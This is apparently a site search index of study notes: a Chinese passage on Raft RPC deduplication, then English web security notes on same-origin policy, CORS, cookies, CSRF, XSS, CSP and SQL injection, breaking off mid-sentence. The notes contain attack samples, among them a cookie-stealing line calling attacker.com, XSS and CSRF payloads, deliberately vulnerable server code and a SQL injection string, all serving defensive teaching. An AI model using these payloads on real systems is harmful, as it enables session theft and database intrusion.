\u4e3a\u4e86\u89e3\u51b3\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u91cd\u590d\u7684RPC\u8bf7\u6c42\u8fdb\u884c\u68c0\u6d4b\u3002\u6211\u4eec\u7ed9\u6bcf\u4e2a\u8bf7\u6c42\u5206\u914d\u4e00\u4e2aID\uff0c\u5982\u679c\u5ba2\u6237\u7aef\u53d1\u73b0\u8d85\u65f6\u800c\u91cd\u65b0\u53d1\u9001\u7684\u8bf7\u6c42\u4f7f\u7528\u76f8\u540c\u7684ID\u3002\u670d\u52a1\u7aef\u9700\u8981\u7ef4\u62a4\u4e00\u4e2a\u8868\uff0c\u4ee5\u8fd9\u4e2aID\u4e3a\u7d22\u5f15\uff0c\u628a\u6bcf\u4e2aRPC\u8bf7\u6c42\u7684\u7ed3\u679c\u4e5f\u653e\u8fdb\u53bb\uff0c\u5982\u679c\u53d1\u73b0\u4e86\u76f8\u540c\u7684ID\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u628a\u7ed3\u679c\u8fd4\u56de\u3002</p> <p>\u4ec0\u4e48\u65f6\u5019\u53ef\u4ee5\u5220\u9664\u8868\u4e2d\u7684\u6761\u76ee\uff1f \u4e3a\u4e86\u8ba9\u8868\u5c3d\u53ef\u80fd\u7684\u5c0f\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u8868\u4e2d\u6bcf\u6761\u8bb0\u5f55\u5bf9\u5e94\u6bcf\u4e2a\u5ba2\u6237\u7aef\uff0c\u800c\u975e\u6bcf\u6761RPC\u8bf7\u6c42\u3002\u6bcf\u4e2a\u5ba2\u6237\u7aef\u540c\u65f6\u53ea\u80fd\u6709\u4e00\u4e2a\u672a\u5b8c\u6210\u7684RPC\u8bf7\u6c42\uff0c\u6211\u4eec\u7ed9\u6bcf\u4e2a\u5ba2\u6237\u7aef\u4e00\u4e2aClientID\uff0c\u5b83\u53d1\u51fa\u7684\u8bf7\u6c42\u5e26\u4e00\u4e2a\u5e8f\u53f7Seq\u3002\u5bf9\u4e8e\u6bcf\u4e2a\u8bf7\u6c42\u5148\u68c0\u6d4b\u8868\u4e2d\u6709\u6ca1\u6709ClientID\u7684\u8bb0\u5f55\uff0c\u6709\u7684\u8bdd\u5c31\u53bb\u6bd4\u8f83Seq\uff0c\u5f53\u8bf7\u6c42\u4e2d\u7684Seq\u66f4\u5927\u65f6\u624d\u53bb\u6267\u884craft\u4e2d\u7684Start()\u65b9\u6cd5\uff0c\u5728raft\u4e2d\u7684\u6bcf\u6761Log\u4e5f\u8bb0\u5f55\u4e0aClientID\u548cSeq\uff0c\u8fd9\u6837\u5f53applyCh\u4e2d\u51fa\u73b0\u8bb0\u5f55\u65f6\uff0c\u518d\u628a\u65b0\u7684Seq\u66f4\u65b0\u81f3\u8868\u4e2d\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u65b0\u7684leader\u63a5\u624b\uff0c\u600e\u4e48\u628a\u8868\u4f20\u7ed9\u5b83\uff1f \u6240\u6709\u7684follower\u8282\u70b9\u90fd\u5e94\u8be5\u5728\u6267\u884c\u66f4\u65b0\u65f6\u81ea\u8eab\u7ef4\u62a4\u4e00\u4efd\u8be5\u8868\uff0c\u6240\u4ee5\u4e0d\u5b58\u5728\u4f20\u7684\u95ee\u9898\uff0c\u5982\u679c\u53d8\u4e3aleader\u672c\u8eab\u5c31\u6709\u3002</p> <p>\u5982\u679c\u670d\u52a1\u5668\u5d29\u6e83\uff0c\u5982\u4f55\u6062\u590d\u8be5\u8868\uff1f \u5982\u679c\u6ca1\u6709\u5feb\u7167\uff0c\u91cd\u65b0\u6267\u884c\u65e5\u5fd7\u65f6\u4f1a\u8fd0\u884c\u5e76\u8ba1\u7b97\u51fa\u8be5\u8868\u3002\u5982\u679c\u6709\u5feb\u7167\uff0c\u5feb\u7167\u4e2d\u5e94\u8be5\u4fdd\u5b58\u4e00\u4efd\u8be5\u8868\u3002</p>"},{"location":"other/security/","title":"Web Security","text":""},{"location":"other/security/#same-origin-policy","title":"Same Origin Policy","text":"<p>Two pages from different sources should not be allowed to interface with each other! This is the fundamental security model of the web. The browser is analogous to an OS kernel, an origin is analogous to an OS process, so site rely on the browser to enfoce all the system security rules.</p>"},{"location":"other/security/#definition","title":"Definition","text":"<p>The origin means <code>protocal-host-port</code> tuple, this can be described as: <pre><code>def isSameOrigin(url1, url2):\n    return url1.protocol == url2.protocal and url1.hostname == url2.hostname and url1.port == url2.port\n</code></pre></p> <p>If two sites do not comply with same origin policy, they can't:</p> <ul> <li>Read each other's Cookie,LocalStorage,IndexdDB</li> <li>Get each other's DOM</li> <li>Send to each other AJAX request</li> </ul> <p>But they can embed static resources from another origin, like Images,Scripts,Styles.</p> <p>Sometimes policy is too narrow, it's difficult to get <code>login.stanford.edu</code> and <code>axess.stanford.edu</code> to exchange data; but sometimes it's too broad, there is no way to isolate <code>https://web.stanford.edu/class/cs106a/</code> and <code>https://web.stanford.edu/class/cs253/</code>. We need a way around Same Origin Policy to allow two different origins to communicate.</p>"},{"location":"other/security/#cookie","title":"Cookie","text":"<p>If two sites have a top-level domain, different sub domain, e.g.<code>login.stanford.edu</code> and <code>axess.stanford.edu</code>, then they can define: <pre><code>document.domain = 'stanford.edu';\ndocument.cookie = \"userid=test1\";\n</code></pre> and the axess site can read the cookie. More examples:</p> Originating URL document.domain Accessed URL document.domain Allowed http://www.a.com/ a.com http://pay.a.com/ a.com YES http://www.a.com/ a.com https://pay.a.com/ a.com NO http://pay.a.com/ a.com http://a.com/ (not set) NO http://www.a.com/ (not set) http://www.a.com/ a.com NO <p>Another way to do this is to use server response: <pre><code>Set-Cookie: userid=test1; domain=.stanford.edu; path=/\n</code></pre> Both resolution can't resolve the <code>attack.stanford.edu</code> access content from <code>axess.stanford.edu</code>, so it's bad!</p>"},{"location":"other/security/#iframe","title":"iframe","text":"<p>If two sites not match Same Origin Policy, they can't get each other's DOM. For example, when you use <code>iframe</code> or <code>window.open</code> to open a new child window, they can not communicate with the parent window.  <pre><code>document.getElementById(\"myIFrame\").contentWindow.document\n// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.\n</code></pre> There are 3 ways to resolve this situation.</p> <p>fragment identifier</p> <p>For a url <code>http://example.com/x.html#fragment</code>, the content after <code>#</code> is fragment, when you change the fragment, the page does not refresh.</p> <p>So the parent window can write data to child window's fragment like this: <pre><code>var src = originURL + '#' + data;\ndocument.getElementById('myIFrame').src = src;\n</code></pre> Then the child window can monitor an event named <code>hashchange</code> to get the notice: <pre><code>window.onhashchange = checkMessage;\nfunction checkMessage() {\n  var message = window.location.hash;\n  // ...\n</code></pre> The child window also can change parent window's fragment: <pre><code>parent.location.href= target + \"#\" + hash;\n</code></pre></p> <p>window.name</p> <p>Each browser window has a <code>window.name</code> property, this property has a quality, even if the page jump to a new location, the <code>window.name</code> will still be retained.</p> <p>For example, the <code>http://parent.com/a.html</code> has a iframe src to <code>http://child.com</code>. When the child page loaded it can set it's <code>window.name=data</code>, and then use <code>location.href='http://parent.com/empty'</code>to redirect the same origin page as parent. Now the parent can get the data simple use <code>$('iframe').contentWindow.name</code>.</p> <p>This property can exchange serveral MB data once, but monitor the child window name change is a performance loss.</p> <p>window.postMessage</p> <p>The above methods are hack method, the <code>window.postMessage</code> is a new cross-document messaging API design to resolve this situation. It can be used for complicated objects, handle cycles, read/write localstorage etc.</p> <p>For example, when the parent window want to send a message to child: <pre><code>var popup = window.open('http://child.com', 'title');\npopup.postMessage('Hello World!', 'http://child.com');\n</code></pre> The first parameter of <code>postMessage</code> method is data, the second is origin(<code>protocal-host-port</code> tuple), also can use <code>*</code> represent all window.  </p> <p>The child also can send message to parent: <pre><code>window.opener.postMessage('Nice to see you', 'http://parent.com');\n</code></pre></p> <p>They both can monitor message use a <code>message</code> event: <pre><code>window.addEventListener('message', function(event) {\n  console.log(event.data);\n},false);\n</code></pre></p> <p><code>event</code> object has 3 property, <code>event.data</code> is the content of this message, <code>event.source</code> means which window send this message, <code>event.origin</code> means which origin send this message. So you can filter the message which not send to you and send back directly which send to you. <pre><code>window.addEventListener('message', receiveMessage);\nfunction receiveMessage(event) {\n  if (event.origin !== 'http://parent.com') return;\n  if (event.data === 'Hello World') {\n      event.source.postMessage('Hello back', event.origin);\n  } else {\n    console.log(event.data);\n  }\n}\n</code></pre></p>"},{"location":"other/security/#ajax","title":"AJAX","text":"<p>Except for build a proxy server to respect same origin policy, there are other 3 ways,  JSONP, WebSocket and CORS.</p>"},{"location":"other/security/#jsonp","title":"JSONP","text":"<p>The JSONP is an old hack method for client and server cross origin communicate.It can support old browser and small change for the server side.</p> <p>The key idea is client add a html element <code>&lt;script&gt;</code>, through the attribute <code>src</code> send request to the server side. When the server side reponse data, they put data into a particular callback function.</p> <p><pre><code>function addScriptTag(src) {\n  var script = document.createElement('script');\n  script.setAttribute(\"type\",\"text/javascript\");\n  script.src = src;\n  document.body.appendChild(script);\n}\n\nwindow.onload = function () {\n  addScriptTag('http://example.com/ip?callback=foo');\n}\n\nfunction foo(data) {\n  console.log('Your public IP address is: ' + data.ip);\n};\n</code></pre> The above code dynamic add the <code>&lt;script&gt;</code> element and sent request to <code>example.com</code>, and the request url contains a callback parameter names <code>foo</code>. Then the server recive the request and put data into the callback funtion to response. <pre><code>foo({\n  \"ip\":\"8.8.8.8\"\n})\n</code></pre> Because of the html element <code>&lt;script&gt;</code> request script will directly run in the browser, and the function <code>foo</code> is defined before, so it will be call.</p>"},{"location":"other/security/#websocket","title":"WebSocket","text":"<p>The WebSocket is a kind of communicate protocol, it use <code>ws://</code> and <code>wss://</code>(encrypt) for the scheme. This protocol does not obey the same origin policy. If the server side supported, you can communicate with different origin.</p> <p>The browser send request like this: <pre><code>GET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\nOrigin: http://example.com\n</code></pre> The server side can decide whether not send response back base on the <code>origin</code> attribute. <pre><code>HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\nSec-WebSocket-Protocol: chat\n</code></pre></p>"},{"location":"other/security/#cors","title":"CORS","text":"<p>Once the browser detects there is an cross-origin AJAX request, will automatic add some more request header attribute. And the server found this addional information, respect the CORS protocal send back the response, they can communicate.</p> <p>The browser divided CORS request into two categories, simple request and not-so-simple request.If a request met the following two conditions, it is a simple request, otherwise, it is a not-so-simple request.</p> <pre><code>1. request method is HEAD, GET or POST\n2. request header attribute does not exceed the following fields:\n* Accept\n* Accept-Language\n* Content-Language\n* Last-Event-ID\n* Content-Type\uff1aapplication/x-www-form-urlencoded\u3001multipart/form-data\u3001text/plain(other value is not obey)\n</code></pre> <p>Simple request  For the simple request, the browser will auto add an Origin field on the header of request, the origin contain current scheme, domain and port.</p> <p>If the server want to response this origin, it must add some response header:  </p> <ul> <li>Access-Control-Allow-Origin. It can be the origin of request header, or a <code>*</code> means any domain</li> <li>Access-Control-Allow-Credentials. If this is <code>true</code>, means the ajax request can contains the cookie</li> <li>Access-Control-Expose-Headers. The <code>getResponseHeader()</code> of a <code>XMLHttpRequest</code> object can only get 6 basic response header field, if want more, you must add the field to this attribute.</li> </ul> <p>Not-so-simple request  For the not-so-simple request,the browser will send a preflight requst before the formal request.</p> <p>The preflight request is an <code>OPTIONS</code> request, and it will add <code>Access-Control-Request-Method</code> field express the formal request's method, add <code>Access-Control-Request-Headers</code> if the formal request has some other request header fields.</p> <p>The server receive preflight request, will check <code>Origin</code>, <code>Access-Control-Request-Method</code> and <code>Access-Control-Request-Headers</code>field to decide whether allow this cross-origin request. If allowed, the response header should be:</p> <ul> <li>Access-Control-Allow-Methods. It means all the allow request method of the server.</li> <li>Access-Control-Allow-Headers. It means all request header fields the server can support.</li> <li>Access-Control-Allow-Credentials. Same as simple request.</li> <li>Access-Control-Max-Age. It specify the validity period of this preflight request.</li> </ul> <p>Once the server allow this preflight request, the later CORS request will all same as simple request.</p>"},{"location":"other/security/#session-attack","title":"Session Attack","text":""},{"location":"other/security/#session-and-cookie","title":"Session and Cookie","text":"<p>The Http protocol is statusless, we need the server keeps a set of data related to a user's current browsing session, like Logins,Shopping carts,User tracking etc.The most common way is Cookies. Session desired these properties:</p> <ul> <li>Browser remember user(so user doesn't need to repeatedly log in)</li> <li>User cannot modify session cookie to login as another user</li> <li>Session cookies are not valid forever</li> <li>Session can be deleted on the server-side</li> <li>Session should expire after some time, e.g. 30 days</li> </ul> <p>When the server Set-Cookie, cookie have some basic attributes:</p> <ul> <li>Expires, Specifies expiration date. If no date, then lasts for \"browser session\". If set to <code>Thu, 01 Jan 1970 00:00:00 GMT</code> will delete this cookie name and its value</li> <li>Path, Scope the \"Cookie\" header to a particular request path prefix, e.g. <code>Path=/docs</code> will match <code>/docs</code> and <code>/docs/web</code></li> <li>Domain, Allows the cookie to be scoped to a \"broader domain\"(within the same registrable domain), e.g. <code>sub.a.com</code> can set cookies for <code>a.com</code></li> </ul> <p>The Cookies setting don't obey Same Origin Policy, because cookies were created before Same Origin Policy, they have different security model. Sometimes Cookies are more restrictive than Same Origin Policy, like <code>Path</code> partions cookies by path, but is ineffective, because pages on same origin can access each other's DOMs, run code in each other's contexts;The other time Cookies are less restrictive than Same Origin Policy, like Pages with same hostname can share the cookies, the protocol and port are ignored, and different origins(e.g. subdomain) can mess with each others cookies.</p>"},{"location":"other/security/#session-hijacking","title":"Session hijacking","text":""},{"location":"other/security/#over-http-steal-cookie","title":"Over Http steal cookie","text":"<p>Sending cookies over unencrypted HTTP is a very bad idea.If anyone sees the cookie, they can use it to hijack the user's session, attacker sends victim's cookie as if it was their own, server will be fooled.  </p> <p>How to mitigation this session hijacking, use the <code>Set-Cookie: key=value; Secure</code> cookie attribute will prevent cookie from being sent over unencrypted HTTP connections. An even better solution is use https for entire website.</p>"},{"location":"other/security/#xss-steal-cookie","title":"XSS steal cookie","text":"<p>XSS is Cross Site Scripting. What if attacker can insert their code into the webpage? At this point, they can easily exfiltrate the user's cookie. <code>new Image().src='http://attacker.com/steal?cookie=' + document.cookie</code>.</p> <p>The <code>HttpOnly</code> cookie attribute can prevent cookie from being read from JavaScript, use <code>Set-Cookie: key=value; Secure; HttpOnly</code>.</p>"},{"location":"other/security/#csrf","title":"CSRF","text":"<p>Consider this HTML embedded in attacker.com: <pre><code>&lt;h1&gt;Welcome to your account!&lt;/h1&gt;\n&lt;img src='https://bank.com/avatar.png' /&gt;\n</code></pre> The browser helpfully includes bank.com cookies in all requests to bank.com, even though the request originated from attacker.com, attacker.com can embed user's real avatar from bank.com. What if the embedded HTML is <code>&lt;img src='https://bank.com/withdraw?from=bob&amp;to=mallory&amp;amount=1000'&gt;</code>. Attack which forces an end user to execute unwanted actions on a web app in which they're currently authenticated, effective even when attacker can't read the HTTP response. This kind of hijacking is called Cross-Site Request Forgery(CSRF).</p> <p>How to mitigate CSRF?</p> <p>The answer is use SameSite cookie attributes, this will prevent cookie from being sent with requests initiated by other sites.  </p> <ul> <li>SameSite=None - default, always send cookies</li> <li>SameSite=Lax - withhold cookies on subresource requests originating from other sites, allow them on top-level requests</li> <li>SameSite=Strict - only send cookies if the request originates from the website that set the cookie</li> </ul> <p>This table discribe when the request send to another site, different SameSite attribute send cookie or not:</p> Request type Request example None Lax Strict Link <code>&lt;a href=\"...\"&gt;&lt;/a&gt;</code> Send Send Not Preload <code>&lt;link rel=\"prerender\" href=\"...\"/&gt;</code> Send Send Not Form Get <code>&lt;form method=\"GET\" action=\"...\"&gt;</code> Send Send Not Form Post <code>&lt;form method=\"POST\" action=\"...\"&gt;</code> Send Not Not iframe <code>&lt;iframe src=\"...\"&gt;&lt;/iframe&gt;</code> Send Not Not AJAX <code>$.get(\"...\")</code> Send Not Not Image <code>&lt;img src=\"...\"&gt;</code> Send Not Not"},{"location":"other/security/#summary","title":"Summary","text":"<ul> <li>Never trust data from the client</li> <li>Don't use broken cookie Path attribute for security</li> <li>Use SameSite=Lax to protect against CSRF attacks</li> <li>If you remember one thing: set your cookie like this: <pre><code>Set-Cookie: key=value; Secure; HttpOnly; Path=/;\nSameSite=Lax; Expires=Fri, 1 Nov 2021 00:00:00 GMT\n(Expires should be set to 30days later)\n</code></pre></li> </ul>"},{"location":"other/security/#xss","title":"XSS","text":"<p>XSS(cross site scripting) is a code injection vulnerablity, it's caused when untrusted user data unexpected becomes code. The unexpected code is JavaScript in an HTML document. If successful, attacker gains the ablility to do anything the target can do through their browser, like view/exfiltrate their cookies, send any HTTP request to the site with the user's cookies!</p> <p>XSS is prevalent, the web has so many different languages, data can be used in many different contexts! Even within HTML, there are at least 5 contexts to understand. And each context has different \"control characters\". If you slip up in even one place, you're completely vulnerable!</p>"},{"location":"other/security/#attack-type","title":"Attack Type","text":"<p>Usually there are two types attack, reflected XSS attack and stored XSS attack.</p> <p>In reflected XSS, the attack code is placed into the HTTP request itself, the attacker goal is to find a URL that can make target visit, URL includes attack code. So the limitation is attack code must be added to the URL path or query parameters.</p> <p>In stored XSS, the attack code is persisted into the database, the attacker goal is to use any means to get attack code into the database. Once there, server includes it in all pages sent to clients.</p> <p>If the server code is: <pre><code>app.get('/', (req, res) =&gt; {\n  const { source } = req.query\n  res.send(`\n    &lt;h1&gt;\n    ${source ? `Hi ${source} reader!` : ''}\n    Login to your bank account:\n    &lt;/h1&gt;\n  `)\n})\n</code></pre></p> <p>The attack url can be: <code>http://localhost:4000/?source=%3Cscript%3Ealert(%27hey%20there!%27)%3C/script%3E</code></p> <p>This is a typical reflected XSS, the server does not stored attack code into database, attacker need to send url to goal.</p>"},{"location":"other/security/#attack-example","title":"Attack Example","text":""},{"location":"other/security/#html-elements","title":"HTML elements","text":"<p>HTML template<pre><code>&lt;p&gt;Search result for USER_DATA_HERE&lt;/p&gt;\n</code></pre> Resulting page(no escape)<pre><code>&lt;p&gt;Search result for &lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/p&gt;\n</code></pre> what is the fix?  </p> <ul> <li>change all <code>&lt;</code> to <code>&amp;lt;</code></li> <li>change all <code>&amp;</code> to <code>&amp;amp;</code></li> </ul>"},{"location":"other/security/#html-attributes","title":"HTML attributes","text":"<p>HTML template<pre><code>&lt;img src='avatar.png' alt='USER_DATA_HERE' /&gt;\n</code></pre> Resulting page(no escape)<pre><code>&lt;img src='avatar.png' alt='Feross' onload='alert(document.cookie)' /&gt;\n</code></pre> what is the fix?  </p> <ul> <li>change all <code>'</code> to <code>&amp;apos;</code></li> <li>change all <code>\"</code> to <code>&amp;quot;</code></li> <li>change all <code>&amp;</code> to <code>&amp;amp;</code></li> </ul> <p>what about set html attributes without quotes? HTML template<pre><code>&lt;img src='avatar.png' alt=USER_DATA_HERE /&gt;\n</code></pre> Resulting page(escaping ' and double quotes and &amp;)<pre><code>&lt;img src=avatar.png alt=Feross onload=alert(document.cookie) /&gt;\n</code></pre> It's a bad idea! Should always quotes attributes!</p> <p>HTML template<pre><code>&lt;div onmouseover='handleHover(USER_DATA_HERE)'&gt;\n</code></pre> Resulting page(escaping ' and double quotes)<pre><code>&lt;div onmouseover='handleHover(); alert(document.cookie)'&gt;\n</code></pre></p> <p>what is the fix? escape one more char <code>;</code></p> <p>For most attributes, escaping attributes is sufficient. But certain attributes like <code>src</code>,<code>href</code>,<code>data:</code>,<code>javascript:</code> can never be safe, even if you escape the attribute value!</p>"},{"location":"other/security/#script-elements","title":"Script elements","text":"<p>HTML template<pre><code>&lt;script&gt;\n  let username = 'USER_DATA_HERE'\n  alert(`Hi there, ${username}`)\n&lt;/script&gt;\n</code></pre> Resulting page(no escape)<pre><code>&lt;script&gt;\n  let username = 'Feross'; alert(document.cookie); //'\n  alert(`Hi there, ${username}`)\n&lt;/script&gt;\n</code></pre> If we just change all <code>'</code> to <code>\\'</code> , <code>\"</code> to <code>\\\"</code>, it still work! The user input can be <code>Feross\\'; alert(document.cookie) //</code> .</p> <p>If we change one more <code>\\</code> to <code>\\\\</code>, it still broken! The user input can be <code>&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;</code>.</p> <p>what is the fix?</p> <ul> <li>Hex encode user data to produce a string with characters 0-9, A-F.</li> <li>Include it inside a JavaScript string</li> <li>Then, decode the hex string</li> </ul> <pre><code>&lt;script&gt;\n  let username = hexDecode('HEX_ENCODED_USER_DATA')\n  alert(`Hi there, ${username}`)\n&lt;/script&gt;\n</code></pre> <p>Now if the user still input <code>&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;</code>, the result will be <code>hexDecode('3c2f736372697074...')</code>. It works!</p> <p>Another solution is use a <code>&lt;template&gt;</code> tag to store data that won't visibly render, then the escaping rules are simple and the same as for HTML elements, just HTML encode <code>&lt;</code> and <code>&amp;</code> characters.</p> <pre><code>&lt;template id='username'&gt;HTML_ENCODED_USER_DATA&lt;/template&gt;\n&lt;script&gt;\n  let username = document.getElementById('username').textContent\n  alert(`Hi there, ${username}`)\n&lt;/script&gt;\n</code></pre>"},{"location":"other/security/#never-safe-context","title":"Never safe context","text":"<p>There are some context never safe, we should avoid! <pre><code>&lt;script&gt;USER_DATA_HERE&lt;/script&gt;\n\n&lt;!-- USER_DATA_HERE --&gt;\n\n&lt;USER_DATA_HERE href='/'&gt;Link&lt;/USER_DATA_HERE&gt;\n\n&lt;div USER_DATA_HERE='some value'&gt;&lt;/div&gt;\n\n&lt;style&gt;USER_DATA_HERE&lt;/style&gt;\n</code></pre></p>"},{"location":"other/security/#xss-defenses","title":"XSS defenses","text":"<p>The code injection is caused when untrusted user data unexpectedly becomes code. So we need to escape or sanitize user input before combing it with code(the HTML template).</p> <p>where untrusted data comes from</p> <ul> <li>HTTP request from user, like query parameters, form fields, headers, cookies, file uploads</li> <li>Data from a database. When you works in a large team, who knows how the data got into the database?</li> <li>Third-party services. We don't know it's safe, maybe the service gets hacked and sending unsafe data</li> </ul> <p>when to escape</p> <p>On the way into the database or on the way out at render time? We should always on the way out at render time.</p> <p>Because even if you are sure that you control all possible ways for data to get into the database, you don't know in advance what context the data will appear in. Different contexts have different control characters.</p> <p>how to escape</p> <p>Use your framework's built-in HTML escaping functionality, if bugs are found, you will get the fix for free! Also, make sure you know the contexts where it is safe to use the output.</p>"},{"location":"other/security/#csp","title":"CSP","text":"<p>The Same Origin Policy is to prevent some other sites making certain requests to our site. CSP is inverse, it prevent our site from make requests to other sites.</p> <p>CSP is an added layer of security against XSS, even if attacker code is running on user's browser in our site's context, we can limit the damage they can do.</p> <p>CSP blocks HTTP requests which would violate the policy. Add the Content-Security-Policy header to an HTTP response to control the resources the page is allowed to load.</p>"},{"location":"other/security/#using-csp","title":"Using CSP","text":"<p>The snippet below shows a CSP response heeader with a minimal policy configuration:</p> <pre><code>Content-Security-Policy: script-src 'self'\n</code></pre> <p>The server includes this header on the response that sends an HTML page to the browser. The policy configuration tells the browser that ths page can only execute scripts coming from its own origin.This means that if the application is running on <code>https://example.com/app</code>, the browser only executes remote JavaScript code comming from <code>https://example.com</code>, anyting else is blocked, include <code>*.example.com</code>.</p> <p>For example: <pre><code>&lt;!-- Not allowed! Inline scripts are prevented --&gt;\n&lt;img src=\"none.png\" onerror=\"evilCode()\"&gt;\n&lt;!-- Not allowed! Inline scripts are prevented  --&gt;\n&lt;script&gt;evilCode()&lt;/script&gt;\n&lt;!-- Not allowed! Remote script comes from a different origin  --&gt;\n&lt;script src=\"https://evil.com/code.js\"&gt;&lt;/script&gt;\n&lt;!-- Allowed! Relative URLs are loaded from the same origin --&gt;\n&lt;script src=\"/code.js\"&gt;&lt;/script&gt;\n</code></pre></p>"},{"location":"other/security/#directives-and-values","title":"Directives and Values","text":"<p>The CSP syntax is: <pre><code>Content-Security-Policy: &lt;policy-directive&gt;; &lt;policy-directive&gt;\n</code></pre> Where <code>&lt;policy-directive&gt;</code> consists of: <code>&lt;directive&gt; &lt;value&gt; &lt;value2&gt;</code> with no internal punctuation. </p> <p>The CSP fetch directives control the locaions from which certain resource types may be loaded. Some commonly used directives are as follows:</p> <ul> <li>default-src, Serves as a fallback for other fetch directives</li> <li>connect-src, Restricts sources from \"script interfaces\": fetch, XHR, WebSocket, <code>&lt;a ping&gt;</code> etc.</li> <li>frame-src, Restricts sources for nested browsing contexts: <code>&lt;frame&gt;</code>, <code>&lt;iframe&gt;</code></li> <li>img-src, Restricts sources for images, favicons</li> <li>script-src, Restricts sources for <code>&lt;script&gt;</code> elements</li> <li>style-src, Restricts sources for <code>&lt;style&gt;</code> and <code>&lt;link rel='stylesheet'&gt;</code> elements</li> <li>media-src, Restricts sources for media: <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;track&gt;</code></li> </ul> <p>There are also some directives do not inherit from <code>defalut-src</code>, include <code>base-uri</code>, <code>form-action</code>, <code>frame-ancestors</code>, <code>navigate-to</code>, <code>upgrade-insecure-requests</code>.</p> <p>An overview of the allowed values are listed below:</p> <ul> <li>none, Won't allow loading of any resources</li> <li>self, Only allow resources from the current origin</li> <li>unsafe-inline, Allow use of inline resources</li> <li>Host, Only allow loading of resources from a specific host, also can add the path part. e.g. <code>*.a.com</code>, <code>b.com/c/</code></li> <li>Scheme, Only allow loading resources over a specific scheme. e.g. <code>http:</code>, <code>https:</code>, <code>data:</code></li> </ul>"},{"location":"other/security/#csp-level-2","title":"CSP Level 2","text":"<p>Unsurprisingly, such a CSP policy is wildly incompatible with many applications. Even today, we often rely on inline code blocks to load JavaScript code into application. CSP Level 2 aims to make CSP more compatible with real-world applications without compromising security. It introduces two mechanims: hashes and nonces.</p> <p><pre><code>&lt;button id=\"hello\"&gt;Say Hello!&lt;/button&gt;\n&lt;script&gt;\ndocument.addEventListener(\"DOMContentLoaded\", () =&gt; {\n  document.getElementById(\"hello\")\n      .addEventListener(\"click\", () =&gt; { alert(\"Hello!\")});\n})\n&lt;/script&gt;\n</code></pre> For this simplified example, if we use hashes mechanims, we need to calculates the hash of the script block and add it to the CSP policy. <pre><code>Content-Security-Policy: script-src 'sha256-6X6+1K/DKkKDJXeIXoOfaIX+FzybN9LaGtutkR5DWpQ='\n</code></pre> If you change any charactor of the script, the hashes will need to update. So typically we do not calculate these hashes manually.If you load application in a Chromium-based browser, you can find the expected hash in the error messages of the developer console, as shown below: <pre><code>Refused to execute inline script because it violates the following Content Security Policy directive: \"script-src 'self'\".\nEither the 'unsafe-inline' keyword, a hash ('sha256-6X6+1K/DKkKDJXeIXoOfaIX+FzybN9LaGtutkR5DWpQ='), or a nonce ('nonce-...') is required to enable inline execution.\n</code></pre></p> <p>The nonces mechanims need you configured both script block and CSP policy with a nonce attribute and with same value. <pre><code>Content-Security-Policy: script-src 'nonce-1f40e4a23493'\n</code></pre> It supports both inline codes and remote code files. <pre><code>&lt;script src=\"https://analytics.example.com/1.js\" nonce=\"1f40e4a23493\"&gt;&lt;/script&gt;\n</code></pre> Nonces should be generated from a cryptographically secure random source and should never be re-used. Otherwise, an attacker can predict the nonce and include a valid nonce on injected code blocks.</p>"},{"location":"other/security/#strict-dynamic","title":"strict-dynamic","text":"<p>The CSP above has an issue, which is many real-world CSP policies contain patterns that allow an attacker to bypass the policy. This famous paper descripe how to bypass the policy. The paper recommends abandoning URL-based policies in favor of hash-based and nonce-based policies.</p> <p>To make this work, we need a mechanism to enable cascading JavaScript loading. So, the <code>strict-dynamic</code> comes. If we set this keyword to our CSP policy, it tells the browser: If you encouter a script that was loaded with a hash or a nonce, you can allow that script to load remote code dependencies by inserting additional script elements into the page. </p> <p>Since <code>strict-dynamic</code> was introduced to counter URL-based bypass attacks, it is incompatible with URLs. <code>strict-dynamic</code> only allow scripts that have been approved with a nonce or a hash to load additional resources. In fact, when a browser encounters <code>strict-dynamic</code>, it will automatically ignore URL-based expressions.</p>"},{"location":"other/security/#universal-csp-policy","title":"Universal CSP Policy","text":"<p>How you build a policy depends a bit on your specific situation. But we can refer to Google's policy, which offers effective protection against XSS vulnerablities without potentially breaking any of their applications. The snippet is formatted for readablity:</p> <pre><code>Content-Security-Policy: \n  script-src 'report-sample' 'nonce-3YCIqzKGd5cxaIoTibrW/A' 'unsafe-inline'\n             'strict-dynamic' https: http: 'unsafe-eval';\n  object-src 'none';\n  base-uri 'self';\n  report-uri /webchat/_/cspreport\n</code></pre> <p>A modern browser see this policy, will recognizes the nonce which causes the <code>unsafe-inline</code> keyword to be ignored. It will also recognizes <code>strict-dynamic</code>, which causes any URL-based expressions(i.e., <code>http: https:</code>) to be ignored.</p> <p>The legacy browsers that only support CSP Level 2, or even Level 1 , will see a different policy which will ignore <code>strict-dynamic</code> or <code>nonces</code>. Maybe cause some XSS attack, but the application is still work well.</p>"},{"location":"other/security/#sql-injection","title":"SQL Injection","text":"<p>The SQL injection's goal is execute arbitrary queries to the database via a vulnerable application.Read sensitive data from the database, modify database data, execute administration operations on the database, and sometimes issue commands to the operating system.</p> <p>This kind of attack is possible when an application combines unsafe user supplied data(like forms, cookies, HTTP headers, etc.) with a SQL query \"template\".</p>"},{"location":"other/security/#attack-example_1","title":"Attack Example","text":""},{"location":"other/security/#common-example","title":"Common example","text":"<p>Think about this vulnerable code: <pre><code>const { username, password } = req.body\nconst query = `SELECT * FROM users WHERE username = \"${username}\"`\nconst results = db.all(query)\nif (results.length &gt; 0) {\n  // user exists!\n  const user = results[0]\n  if (user.password === password) {\n  // success\n  }\n}\n</code></pre> The expected input is <code>{username: 'larry'}</code>, but malicious input is <code>{username: '\" OR 1=1 --'}</code>. The <code>--</code> is a SQL comment, will 